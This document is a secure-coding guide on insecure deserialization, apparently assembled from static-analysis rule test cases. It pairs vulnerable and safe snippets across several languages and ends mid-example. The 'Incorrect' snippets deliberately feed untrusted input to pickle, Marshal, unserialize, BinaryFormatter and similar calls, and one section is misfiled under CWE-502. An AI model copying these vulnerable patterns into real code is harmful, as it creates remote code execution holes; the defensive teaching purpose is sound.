---
title: Prevent Insecure Deserialization
impact: CRITICAL
impactDescription: Remote code execution allowing attackers to run arbitrary code on the server
tags: security, deserialization, cwe-502
---

## Prevent Insecure Deserialization

Insecure deserialization occurs when untrusted data is used to abuse the logic of an application, inflict denial of service attacks, or execute arbitrary code. Objects can be serialized into strings and later loaded from strings, but deserialization of untrusted data can lead to remote code execution (RCE). Never deserialize data from untrusted sources. Use safer alternatives like JSON for data interchange.

---

### Language: Ruby

#### YAML Deserialization

**Incorrect (vulnerable to code execution via YAML.load):**
```ruby
def bad_deserialization

   o = Klass.new("hello\n")
   data = YAML.dump(o)
   # ruleid: bad-deserialization-yaml
   obj = YAML.load(data)
end
```

**Correct (use safe: true or load from trusted files):**
```ruby
def ok_deserialization
   o = Klass.new("hello\n")
   data = YAML.dump(o)
   # ok: bad-deserialization-yaml
   obj = YAML.load(data, safe: true)

   filename = File.read("test.txt")
   data = YAML.dump(filename)
   # ok: bad-deserialization-yaml
   YAML.load(filename)

   # ok: bad-deserialization-yaml
   YAML.load(File.read("test.txt"))

   # ok: bad-deserialization-yaml
   obj = YAML::load(ERB.new(File.read("test.yml")).result)

   # ok: bad-deserialization-yaml
   obj = YAML::load(ERB.new(File.read("test.yml")))

   template = ERB.new(File.read("test.yml"))
   # ok: bad-deserialization-yaml
   obj = YAML::load(template)

   template = ERB.new(File.read("test.yml")).result
   # ok: bad-deserialization-yaml
   obj = YAML::load(template)

   template = ERB.new(File.read("test.yml"))
   # ok: bad-deserialization-yaml
   obj = YAML::load(template.result)

   # ok: bad-deserialization-yaml
   obj = YAML.load(File.read(File.join(Pathname.pwd, "hello.yml")))
end
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Ruby Security Advisory](https://groups.google.com/g/rubyonrails-security/c/61bkgvnSGTQ/m/nehwjA8tQ8EJ)
- [Brakeman Deserialization Check](https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_deserialize.rb)

---

#### Marshal/CSV/Oj Deserialization (User Input)

**Incorrect (deserializing user-controlled data):**
```ruby
 def bad_deserialization
    o = Klass.new("hello\n")
    data = params['data']
    # ruleid: bad-deserialization
    obj = Marshal.load(data)

    o = Klass.new(params['hello'])
    data = CSV.dump(o)
    # ruleid: bad-deserialization
    obj = CSV.load(data)

    o = Klass.new("hello\n")
    data = cookies['some_field']
    # ruleid: bad-deserialization
    obj = Oj.object_load(data)
    # ruleid: bad-deserialization
    obj = Oj.load(data)
 end
```

**Correct (use safe options or trusted data):**
```ruby
 def ok_deserialization
    o = Klass.new("hello\n")
    data = YAML.dump(o)
    # ok: bad-deserialization
    obj = YAML.load(data, safe: true)

    filename = File.read("test.txt")
    data = YAML.dump(filename)
    # ok: bad-deserialization
    YAML.load(filename)

    # ok: bad-deserialization
    YAML.load(File.read("test.txt"))

   # ok: bad-deserialization
   obj = Oj.load(data,options=some_safe_options)
 end
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Ruby Security Advisory](https://groups.google.com/g/rubyonrails-security/c/61bkgvnSGTQ/m/nehwjA8tQ8EJ)
- [Brakeman Deserialization Check](https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_deserialize.rb)

---

#### Marshal/CSV/Oj Deserialization (Environment Data)

**Incorrect (deserializing request environment data):**
```ruby
 def bad_deserialization
   data = request.env[:name]
   # ruleid: bad-deserialization-env
   obj = Marshal.load(data)

   o = Klass.new(request.env[:name])
   data = CSV.dump(o)
   # ruleid: bad-deserialization-env
   obj = CSV.load(data)

   o = Klass.new("hello\n")
   data = request.env[:name]
   # ruleid: bad-deserialization-env
   obj = Oj.object_load(data)
   # ruleid: bad-deserialization-env
   obj = Oj.load(data)
 end
```

**Correct (use trusted data sources):**
```ruby
 def ok_deserialization
    o = Klass.new("hello\n")
    data = CSV.dump(o)
    # ok: bad-deserialization-env
    obj = CSV.load(data)

    data = get_safe_data()
    # ok: bad-deserialization-env
    obj = Marshal.load(data)

   # ok: bad-deserialization-env
   obj = Oj.load(data,options=some_safe_options)
 end
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Ruby Security Advisory](https://groups.google.com/g/rubyonrails-security/c/61bkgvnSGTQ/m/nehwjA8tQ8EJ)
- [Brakeman Deserialization Check](https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_deserialize.rb)

---

#### AWS Lambda Tainted Deserialization

**Incorrect (deserializing Lambda event data):**
```ruby
def handler(event:, context:)
	foobar = event['smth']

    # ruleid: tainted-deserialization
    obj1 = Marshal.load(foobar)

    data = event['body']['object']
    # ruleid: tainted-deserialization
    obj2 = YAML.load(data)

    # ruleid: tainted-deserialization
    obj3 = CSV.load("o:" + event['data'])
end
```

**Correct (use hardcoded or safe data):**
```ruby
def ok_handler(event:, context:)

    # ok: tainted-deserialization
    obj1 = Marshal.load(Marshal.dump(Foobar.new))

    data = "hardcoded_value"
    # ok: tainted-deserialization
    obj2 = YAML.load(data)

    # ok: tainted-deserialization
    obj3 = CSV.load(get_safe_data())
end
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Ruby Security Documentation](https://ruby-doc.org/core-3.1.2/doc/security_rdoc.html)
- [Ruby Security Advisory](https://groups.google.com/g/rubyonrails-security/c/61bkgvnSGTQ/m/nehwjA8tQ8EJ)

---

### Language: JavaScript / TypeScript

#### Third-Party Object Deserialization (Express)

**Incorrect (using insecure deserialization libraries):**
```typescript
var node_serialize = require("node-serialize")
var serialize_to_js = require('serialize-to-js');

module.exports.value = function (req,res){
	// ruleid: express-third-party-object-deserialization
	node_serialize.unserialize(req.files.products.data.toString('utf8'))
}


module.exports.value1 = function (req,res){
	var str = new Buffer(req.cookies.profile, 'base64').toString();
	// ruleid: express-third-party-object-deserialization
	serialize_to_js.deserialize(str)
}
```

**Correct (use safe alternatives like JSON.parse):**
```typescript
var node_serialize = require("node-serialize")
var serialize_to_js = require('serialize-to-js');

module.exports.value = function (req,res){
	// ok: express-third-party-object-deserialization
	fake.unserialize(req.files)
}


module.exports.value1 = function (req,res){
	var str = new Buffer(req.cookies.profile, 'base64').toString();
	// ok: express-third-party-object-deserialization
	foo.deserialize(str)
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

---

#### gRPC Insecure Connection

**Incorrect (creating insecure gRPC connections):**
```javascript
function test1() {
    // ruleid: grpc-nodejs-insecure-connection
    var grpc = require('grpc');

    var booksProto = grpc.load('books.proto');

    var client = new booksProto.books.BookService('127.0.0.1:50051', grpc.credentials.createInsecure());

    client.list({}, function(error, books) {
        if (error)
            console.log('Error: ', error);
        else
            console.log(books);
    });
}

function test2() {
    // ruleid: grpc-nodejs-insecure-connection
    var {credentials, load, Client} = require('grpc');

    var creds = someFunc() || credentials.createInsecure();

    var client = new Client('127.0.0.1:50051', creds);

    client.list({}, function(error, books) {
        if (error)
            console.log('Error: ', error);
        else
            console.log(books);
    });
}

function test3() {
    // ruleid: grpc-nodejs-insecure-connection
    var grpc = require('grpc');

    var booksProto = grpc.load('books.proto');

    var server = new grpc.Server();

    server.addProtoService(booksProto.books.BookService.service, {});

    server.bind('0.0.0.0:50051', grpc.ServerCredentials.createInsecure());
    server.start();
}
```

**Correct (use SSL/TLS credentials):**
```javascript
function testOk1() {
    // ok: grpc-nodejs-insecure-connection
    var {credentials, Client} = require('grpc');
    var channel_creds = credentials.createSsl(root_certs);
    var client = new Client(address, channel_creds);

    client.list({}, function(error, books) {
        if (error)
            console.log('Error: ', error);
        else
            console.log(books);
    });
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [gRPC Security Best Practices](https://blog.gopheracademy.com/advent-2017/go-grpc-beyond-basics/#:~:text=disables%20transport%20security)

---

### Language: C#

#### BinaryFormatter Deserialization

**Incorrect (using BinaryFormatter which is inherently insecure):**
```csharp
using System.Runtime.Serialization.Formatters.Binary;

namespace InsecureDeserialization
{
    public class InsecureBinaryFormatterDeserialization
    {
        public void BinaryFormatterDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-binaryformatter-deserialization
                BinaryFormatter binaryFormatter = new BinaryFormatter();

                MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(json));
                binaryFormatter.Deserialize(memoryStream);
                memoryStream.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Microsoft BinaryFormatter Security Guide](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)

---

#### LosFormatter Deserialization

**Incorrect (using LosFormatter which is inherently insecure):**
```csharp
using System.Web.UI;

namespace InsecureDeserialization
{
    public class InsecureLosFormatterDeserialization
    {
        public void LosFormatterDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-losformatter-deserialization
                LosFormatter losFormatter = new LosFormatter();
                object obj = losFormatter.Deserialize(json);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Microsoft LosFormatter Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view=netframework-4.8)

---

#### Newtonsoft JSON TypeNameHandling

**Incorrect (using unsafe TypeNameHandling settings):**
```csharp
using Newtonsoft.Json;

namespace InsecureDeserialization
{
    public class InsecureNewtonsoftDeserialization
    {
        public void NewtonsoftDeserialization(string json)
        {
            try
            {
                JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings
                {
                    // ruleid: insecure-newtonsoft-deserialization
                    TypeNameHandling = TypeNameHandling.All
                });
            } catch(Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public void ConverterOverrideSettings(){
            JsonConvert.DefaultSettings = () =>
                //ruleid: insecure-newtonsoft-deserialization
                new JsonSerializerSettings{TypeNameHandling = TypeNameHandling.Auto};
            Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson);
        }

        public void ConverterOverrideSettingsStaggeredInitialize(){
            var settings = new JsonSerializerSettings();
            //ruleid: insecure-newtonsoft-deserialization
            settings.TypeNameHandling = TypeNameHandling.Auto;
            Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson,settings);
        }

        public void ConverterOverrideSettingsMultipleSettingArgs(){
            JsonConvert.DefaultSettings = () =>
                new JsonSerializerSettings{
                    Culture = InvariantCulture,
                    //ruleid: insecure-newtonsoft-deserialization
                    TypeNameHandling = TypeNameHandling.Auto,
                    TraceWriter = traceWriter
                    };
            Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson);
        }
    }
}
```

**Correct (use TypeNameHandling.None or use custom SerializationBinder):**
```csharp
using Newtonsoft.Json;

namespace InsecureDeserialization
{
    public class InsecureNewtonsoftDeserialization
    {
      public void SafeDeserialize(){
        Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson, new JsonSerializerSettings
        {
            //ok: insecure-newtonsoft-deserialization
            TypeNameHandling = TypeNameHandling.None
        });
      }

      public void SafeDefaults(){
        //ok: insecure-newtonsoft-deserialization
        Bar newBar = JsonConvert.DeserializeObject<Bar>(someJson);
      }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Newtonsoft TypeNameHandling Remarks](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm#remarks)

---

#### FsPickler Deserialization

**Incorrect (using FsPickler with default configuration):**
```csharp
using MBrace.FsPickler.Json;

namespace InsecureDeserialization
{
    public class InsecureFsPicklerDeserialization
    {
        public void FsPicklerDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-fspickler-deserialization
                var fsPickler = FsPickler.CreateJsonSerializer();
                MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(json));
                fsPickler.Deserialize<object>(memoryStream);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [FsPickler Disable Subtype Resolution](https://mbraceproject.github.io/FsPickler/tutorial.html#Disabling-Subtype-Resolution)

---

#### NetDataContractSerializer Deserialization

**Incorrect (using NetDataContractSerializer which is inherently insecure):**
```csharp
using System.Runtime.Serialization;

namespace InsecureDeserialization
{
    public class InsecureNetDataContractDeserialization
    {
        public void NetDataContractDeserialization(string json)
        {
            try
            {
                MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(json));

                // ruleid: insecure-netdatacontract-deserialization
                NetDataContractSerializer netDataContractSerializer = new NetDataContractSerializer();
                object obj = netDataContractSerializer.Deserialize(ms);
                Console.WriteLine(obj);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Microsoft NetDataContractSerializer Security](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8#security)

---

#### SoapFormatter Deserialization

**Incorrect (using SoapFormatter which is inherently insecure):**
```csharp
using System.Runtime.Serialization.Formatters.Soap;

namespace InsecureDeserialization
{
    public class InsecureSoapFormatterDeserialization
    {
        public void SoapFormatterDeserialization(string json)
        {
            try
            {
                MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(json));

                // ruleid: insecure-soapformatter-deserialization
                SoapFormatter soapFormatter = new SoapFormatter();
                object obj = soapFormatter.Deserialize(ms);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Microsoft SoapFormatter Remarks](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view=netframework-4.8#remarks)

---

#### TypeFilterLevel.Full

**Incorrect (using TypeFilterLevel.Full in .NET Remoting):**
```csharp
namespace InsecureDeserialization
{
    public class InsecureTypeFilterLevel
    {
        public void SetTFL(string json)
        {
            BinaryServerFormatterSinkProvider serverProvider = new BinaryServerFormatterSinkProvider(formatterProps, null);

            // ruleid: insecure-typefilterlevel-full
            serverProvider.TypeFilterLevel = System.Runtime.Serialization.Formatters.TypeFilterLevel.Full;

            // ruleid: insecure-typefilterlevel-full
            var provider = new BinaryServerFormatterSinkProvider { TypeFilterLevel = TypeFilterLevel.Full };

            var dict = new Hashtable();
            dict["typeFilterLevel"] = "Full";
            // ruleid: insecure-typefilterlevel-full
            BinaryServerFormatterSinkProvider serverProvider2 = new BinaryServerFormatterSinkProvider(dict, null);
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Microsoft TypeFilterLevel Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.typefilterlevel?view=net-6.0)
- [Synacktiv ICS Miami Exploit](https://www.synacktiv.com/en/publications/izi-izi-pwn2own-ics-miami.html)

---

#### FastJSON $type Extension

**Incorrect (using FastJSON with BadListTypeChecking disabled):**
```csharp
using fastJSON;

namespace InsecureDeserialization
{
    public class InsecureFastJSONDeserialization
    {
        public void FastJSONDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-fastjson-deserialization
                var obj = JSON.ToObject(json, new JSONParameters { BadListTypeChecking = false });
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [FastJSON Security Warning](https://github.com/mgholam/fastJSON#security-warning-update)

---

#### JavaScriptSerializer with SimpleTypeResolver

**Incorrect (using SimpleTypeResolver which is inherently insecure):**
```csharp
using System.Web.Script.Serialization;

namespace InsecureDeserialization
{
    public class InsecureJavascriptSerializerDeserialization
    {
        public void JavascriptSerializerDeserialization(string json)
        {
            try
            {
                // ruleid: insecure-javascriptserializer-deserialization
                var serializer = new JavaScriptSerializer(new SimpleTypeResolver());
                serializer.DeserializeObject(json);

                var resolver = new SimpleTypeResolver()
                // ruleid: insecure-javascriptserializer-deserialization
                var serializer2 = new JavaScriptSerializer(resolver);
                serializer2.DeserializeObject(json);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Microsoft SimpleTypeResolver Remarks](https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.simpletyperesolver?view=netframework-4.8#remarks)

---

#### DataContractResolver

**Incorrect (implementing custom DataContractResolver):**
```csharp
namespace DCR
{
    // ruleid: data-contract-resolver
    class MyDCR : DataContractResolver
    {
        public void ResolveDataContract()
        {

        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Microsoft BinaryFormatter Security Guide](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide)

---

### Language: PHP

#### unserialize() with User Input

**Incorrect (unserializing user-controlled data):**
```php
<?php

$data = $_GET["data"];
// ruleid: unserialize-use
$object = unserialize($data);
```

**Correct (use hardcoded or validated data):**
```php
<?php

// ok: unserialize-use
$object2 = unserialize('O:1:"a":1:{s:5:"value";s:3:"100";}');
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [PHP unserialize() Documentation](https://www.php.net/manual/en/function.unserialize.php)
- [OWASP Insecure Deserialization](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization.html)

---

#### extract() with User Data

**Incorrect (extracting user-controlled arrays):**
```php
<?php

$bad = $_GET['some_param'];
// ruleid:extract-user-data
extract($bad, EXTR_PREFIX_SAME, "wddx");
echo "$color, $size, $shape, $wddx_size\n";

$bad2 = $_FILES["/some/bad/path"];
// ruleid:extract-user-data
extract($bad2, EXTR_PREFIX_SAME, "wddx");
```

**Correct (use EXTR_SKIP or trusted data):**
```php
<?php

/* Suppose that $var_array is an array returned from
   wddx_deserialize */

$size = "large";
$var_array = array("color" => "blue",
                   "size"  => "medium",
                   "shape" => "sphere");
// ok: extract-user-data
extract($var_array, EXTR_PREFIX_SAME, "wddx");

// ok: extract-user-data
$ok = $_FILES["/some/bad/path"];
extract($ok, EXTR_SKIP, "wddx");
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [PHP extract() Notes](https://www.php.net/manual/en/function.extract.php#refsect1-function.extract-notes)

---

#### WordPress Plugin Object Injection

**Incorrect (using unserialize/maybe_unserialize with untrusted data):**
```php
<?php

// ruleid: wp-php-object-injection-audit
$content = unserialize($POST['post_content']);

// ruleid: wp-php-object-injection-audit
$rank_math=unserialize($rank_value);

// ruleid: wp-php-object-injection-audit
$import_options = maybe_unserialize($import->options);

// ruleid: wp-php-object-injection-audit
$data = unserialize(base64_decode($var));
```

**Correct (use serialize for output, not unserialize for input):**
```php
<?php

// ok: wp-php-object-injection-audit
$data = serialize(base64_encode($var))
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [WPScan Security Testing Cheat Sheet](https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet#php-object-injection)
- [OWASP PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

---

### Language: Java

#### Java RMI Dangerous Object Deserialization

**Incorrect (using Object type in RMI interfaces):**
```java
// cf. https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/

package de.mogwailabs.BSidesRMIService;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

import java.rmi.Remote;
import java.rmi.RemoteException;

// ruleid:server-dangerous-object-deserialization
public interface IBSidesService extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkID) throws RemoteException;
   void poke(Object attende) throws RemoteException;
}

// ruleid:server-dangerous-object-deserialization
public interface IBSidesService extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkID) throws RemoteException;
   void poke(StringBuilder attende) throws RemoteException;
}
```

**Correct (use primitive types or Integer):**
```java
// ok:server-dangerous-object-deserialization
public interface IBSidesServiceOK extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkID) throws RemoteException;
   void poke(int attende) throws RemoteException;
}

// ok:server-dangerous-object-deserialization
public interface IBSidesServiceOK extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkID) throws RemoteException;
   void poke(Integer attende) throws RemoteException;
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Attacking Java RMI Services After JEP 290](https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
- [HackTricks Java RMI Pentesting](https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi)

---

#### Java RMI Dangerous Class Deserialization

**Incorrect (using non-primitive classes in RMI interfaces):**
```java
// cf. https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/

package de.mogwailabs.BSidesRMIService;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

import java.rmi.Remote;
import java.rmi.RemoteException;

// ruleid:server-dangerous-class-deserialization
public interface IBSidesService extends Remote {
   boolean registerTicket(String ticketID) throws RemoteException;
   void vistTalk(String talkname) throws RemoteException;
   void poke(Attendee attende) throws RemoteException;
}

public class Attendee {
    public int id;
    public String handle;
}
```

**Correct (use primitive types):**
```java
// ok:server-dangerous-class-deserialization
public interface IBSidesServiceOK extends Remote {
   boolean registerTicket(long ticketID) throws RemoteException;
   void vistTalk(long talkID) throws RemoteException;
   void poke(int attende) throws RemoteException;
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Attacking Java RMI Services After JEP 290](https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)

---

#### JMS ObjectMessage Deserialization

**Incorrect (calling getObject() on JMS ObjectMessage):**
```java
package com.rands.couponproject.ejb;

import java.util.Date;

import javax.ejb.ActivationConfigProperty;
import javax.ejb.EJB;
import javax.ejb.MessageDriven;
import javax.jms.JMSException;
import javax.jms.Message;
import javax.jms.MessageListener;
import javax.jms.ObjectMessage;
import javax.jms.TextMessage;

@MessageDriven(activationConfig = {
        @ActivationConfigProperty(
        propertyName = "destinationType", propertyValue = "javax.jms.Queue"),
        @ActivationConfigProperty(
        propertyName = "destination", propertyValue = "java:/jms/queue/MyQueue")
        })
public class IncomeConsumerBean implements MessageListener {

    public void onMessage(Message message) {
        try {
            if (message instanceof ObjectMessage) {
                ObjectMessage msg = (ObjectMessage) message;

                // ruleid: insecure-jms-deserialization
                Object o = msg.getObject(); // variant 1 : calling getObject method directly on an ObjectMessage object

                // ruleid: insecure-jms-deserialization
                Income income = (Income) msg.getObject(); // variant 2 : calling getObject method and casting to a custom class
            }

        } catch (JMSException e) {
            // handle exception
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [BlackHat: Pwning Your Java Messaging With Deserialization Vulnerabilities](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities-wp.pdf)

---

#### SnakeYAML Constructor

**Incorrect (using Yaml() without SafeConstructor):**
```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

public class SnakeYamlTestCase {
    public void unsafeLoad(String toLoad) {
        // ruleid:use-snakeyaml-constructor
        Yaml yaml = new Yaml();
        yaml.load(toLoad);
    }
}
```

**Correct (use SafeConstructor or custom Constructor):**
```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

public class SnakeYamlTestCase {
    public void safeConstructorLoad(String toLoad) {
        // ok:use-snakeyaml-constructor
        Yaml yaml = new Yaml(new SafeConstructor());
        yaml.load(toLoad);
    }

    public void customConstructorLoad(String toLoad, Class goodClass) {
        // ok:use-snakeyaml-constructor
        Yaml yaml = new Yaml(new Constructor(goodClass));
        yaml.load(toLoad);
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [SnakeYAML Deserialization Vulnerability](https://securitylab.github.com/research/swagger-yaml-parser-vulnerability/#snakeyaml-deserialization-vulnerability)

---

#### Jackson Unsafe Deserialization

**Incorrect (using enableDefaultTyping with Object fields):**
```java
private class Car {
    private Fake variable;

    @JsonTypeInfo(use = Id.CLASS)
    private Object color;
    private String type;

    public static void main(String[] args) throws JsonGenerationException, JsonMappingException, IOException {
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();

        try {
            // ruleid: jackson-unsafe-deserialization
            Car car = objectMapper.readValue(Paths.get("target/payload.json").toFile(), Car.class);
            System.out.println((car.getColor()));
        } catch (Exception e) {
            System.out.println("Exception raised:" + e.getMessage());
        }

    }
}

// Additional class to test rule when ObjectMapper is created in a different method
@RestController
public class MyController {
    private ObjectMapper objectMapper;

    @PostConstruct
    public void initialize() {
        objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
    }

    @RequestMapping(path = "/vulnerable", method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_VALUE)
    public GenericUser vulnerable(@CookieValue(name = "token", required = false) String token) {
        byte[] decoded = Base64.getDecoder().decode(token);
        String decodedString = new String(decoded);
        // ruleid: jackson-unsafe-deserialization
        Car obj = objectMapper.readValue(
                decodedString,
                Car.class);
        return obj;
    }
}
```

**Correct (avoid enableDefaultTyping and Object fields):**
```java
public static void anotherMain2(String[] args) throws JsonGenerationException, JsonMappingException, IOException {
    ObjectMapper objectMapper = new ObjectMapper();

    try {
        // ok: jackson-unsafe-deserialization
        Car car = objectMapper.readValue(Paths.get("target/payload.json").toFile(), Another.class);
        System.out.println((car.getColor()));
    } catch (Exception e) {
        System.out.println("Exception raised:" + e.getMessage());
    }

}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Understanding Insecure Implementation of Jackson Deserialization](https://swapneildash.medium.com/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038)
- [On Jackson CVEs - Don't Panic](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)

---

#### ObjectInputStream Deserialization

**Incorrect (using ObjectInputStream to deserialize objects):**
```java
package deserialize;

import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.lang.ClassNotFoundException;

import com.biz.org.UserData;

public class Cls
{
    public UserData deserializeObject(InputStream receivedFile) throws IOException, ClassNotFoundException {
        // ruleid:object-deserialization
        ObjectInputStream in = new ObjectInputStream(receivedFile);
        return (UserData) in.readObject();
    }

    public UserData deserializeObject(InputStream receivedFile) throws IOException, ClassNotFoundException {
        // ruleid:object-deserialization
        try (ObjectInputStream in = new ObjectInputStream(receivedFile)) {
            return (UserData) in.readObject();
        } catch (IOException e) {
            throw e;
        }
    }
}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [OWASP Deserialization of Untrusted Data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)
- [Oracle Java Security Guidelines](https://www.oracle.com/java/technologies/javase/seccodeguide.html#8)

---

#### RESTEasy Insecure Deserialization

**Incorrect (using wildcard @Consumes or missing @Consumes):**
```java
package unsafe.jaxrs;

import java.util.*;
import javax.ws.rs.*;
import javax.ws.rs.core.*;

@Path("/")
public class PoC_resource {
  @POST
  @Path("/concat")
  @Produces(MediaType.APPLICATION_JSON)
  // ruleid: insecure-resteasy-deserialization
  @Consumes({ "*/*" })
  public Map<String, String> doConcat(Pair pair) {
    HashMap<String, String> result = new HashMap<String, String>();
    result.put("Result", pair.getP1() + pair.getP2());

    return result;
  }

  // ruleid:default-resteasy-provider-abuse
  @POST
  @Path("/vulnerable")
  @Produces(MediaType.APPLICATION_JSON)
  public Map<String, String> doConcat(Pair pair) {
    HashMap<String, String> result = new HashMap<String, String>();
    result.put("Result", pair.getP1() + pair.getP2());

    return result;
  }
}
```

**Correct (use specific MediaType in @Consumes):**
```java
package unsafe.jaxrs;

import java.util.*;
import javax.ws.rs.*;
import javax.ws.rs.core.*;

@Path("/")
public class PoC_resource {
  @POST
  @Path("/count")
  @Produces(MediaType.APPLICATION_JSON)
  // ok: insecure-resteasy-deserialization
  @Consumes(MediaType.APPLICATION_JSON)
  public Map<String, Integer> doCount(ArrayList<Object> elements) {
    HashMap<String, Integer> result = new HashMap<String, Integer>();
    result.put("Result", elements.size());

    return result;
  }

  // ok: default-resteasy-provider-abuse
  @GET
  @Path("/tenantmode")
  @Produces(MediaType.TEXT_PLAIN)
  public String getTenantMode() {
    return kubernetesService.getMessage();
  }

}

@Path("/")
@Consumes(MediaType.APPLICATION_JSON)
@Produces(MediaType.APPLICATION_JSON)
public class PoC_resource {

  // ok: default-resteasy-provider-abuse
  @POST
  @Path("/concat")
  public Map<String, String> doConcat(Pair pair) {
    HashMap<String, String> result = new HashMap<String, String>();
    result.put("Result", pair.getP1() + pair.getP2());
    return result;
  }

}
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [Red Hat: How to Avoid Insecure Deserialization](https://access.redhat.com/blogs/766093/posts/3162112)

---

### Language: Python

#### Django Insecure Deserialization

**Incorrect (using pickle/dill/shelve/yaml with request data):**
```python
from django.http import HttpResponse
import datetime

def current_datetime(request):
    user_obj = b64decode(request.cookies.get('uuid'))
    now = datetime.datetime.now()
    html = "<html><body>It is now %s.</body></html>" % now

    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    now = datetime.datetime.now()
    html = "<html><body>It is now %s.</body></html>" % now

    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(user_obj))

def current_datetime(request):
    user_obj = request.cookies.get('uuid')
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(b64decode(user_obj)))

def current_datetime(request):
    # ruleid:avoid-insecure-deserialization
    return "Hey there! {}!".format(pickle.loads(b64decode(request.cookies.get('uuid'))))

def current_datetime(request):
    user_obj = b64decode(request.cookies.get('uuid'))
    # ruleid:avoid-insecure-deserialization
